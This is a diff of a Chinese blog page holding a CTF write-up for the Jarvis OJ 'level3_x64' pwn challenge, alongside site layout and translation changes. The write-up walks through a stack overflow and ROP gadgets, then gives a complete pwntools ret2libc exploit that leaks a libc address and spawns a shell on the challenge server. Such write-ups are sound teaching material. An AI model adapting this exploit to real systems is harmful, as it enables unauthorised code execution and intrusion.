@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9883 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de  64位elf，只开了NX，并且给出了libc文件">
+    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9883 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de  64位elf，只开了NX，并且给出了libc文件  静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”&#x2F;bin&#x2F;sh”">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN level3_x64">
 <meta property="og:url" content="https://darkwing.moe/2019/05/17/XMAN-level3-x64/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9883 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de  64位elf，只开了NX，并且给出了libc文件">
+<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9883 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de  64位elf，只开了NX，并且给出了libc文件  静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”&#x2F;bin&#x2F;sh”">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -212,48 +219,13 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de" target="_blank" rel="noopener">level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de</a></p>
 </blockquote>
 <p>64位elf，只开了NX，并且给出了libc文件</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051709.jpg" alt=""></p>
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh”</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051712.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051710.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051711.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051712.jpg" alt=""></p>
 <p>给出的libc文件中有这两个</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051713.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051713.jpg" alt=""></p>
 <p>那么思路就和level3类似，leak之后计算地址，执行system</p>
 <p>区别同样只在于32位和64位的栈上</p>
 <h2 id="在32位程序运行中，函数参数直接压入栈中"><a href="#在32位程序运行中，函数参数直接压入栈中" class="headerlink" title="在32位程序运行中，函数参数直接压入栈中"></a>在32位程序运行中，函数参数直接压入栈中</h2><ul>
@@ -269,43 +241,15 @@
 </ul>
 <p>ROPgadget查找可用gadget：</p>
 <p>存在pop rdi和rsi的gadget，但没有rdx</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051714.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051714.jpg" alt=""></p>
 <p>在write函数中，rdx即第三个参数为长度，第二个参数是一个内存地址，64位系统下长度为8，那么如果rdx在这个时候大于等于8的话就不需要去刻意处理</p>
 <p>使用gdb简单调试，发现执行完read后的rdx为0x200，满足条件，那么就不需要去考虑rdx</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051715.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051716.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051715.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051716.jpg" alt=""></p>
 <p>构造exp代码如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9883</span>)</span><br><span class="line"><span class="comment"># sh = process('./level3_x64')</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vuln_func = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line">write_libc = libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">sys_libc = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006b1</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line"><span class="comment"># write(STDOUT,write_got,rdx)</span></span><br><span class="line"><span class="comment"># ret = vuln_func</span></span><br><span class="line"><span class="comment"># rdi = 1</span></span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># rsi = write_got</span></span><br><span class="line"><span class="comment"># r15 = temp</span></span><br><span class="line">payload1 += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload1 += p64(write_plt) + p64(vuln_func)</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = write_addr - write_libc</span><br><span class="line">sys_addr = libc_base + sys_libc</span><br><span class="line">bin_sh_addr = libc_base + bin_sh_libc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line"><span class="comment"># system("bin/sh")</span></span><br><span class="line"><span class="comment"># ret = vuln_func</span></span><br><span class="line"><span class="comment"># rdi = bin_sh_addr</span></span><br><span class="line">payload2 += p64(pop_rdi) + p64(bin_sh_addr)</span><br><span class="line">payload2 += p64(sys_addr) + p64(vuln_func)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051717.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051717.jpg" alt=""></p>
 
         </div>
 
@@ -314,7 +258,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-05-17T06:43:34.488Z" itemprop="dateUpdated">2019-05-17 14:43:34</time>
+    Last updated: <time datetime="2019-05-17T06:43:34.488Z" itemprop="dateUpdated">2019-05-17 14:43:34</time>
 </span><br>
 
 
@@ -481,11 +425,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
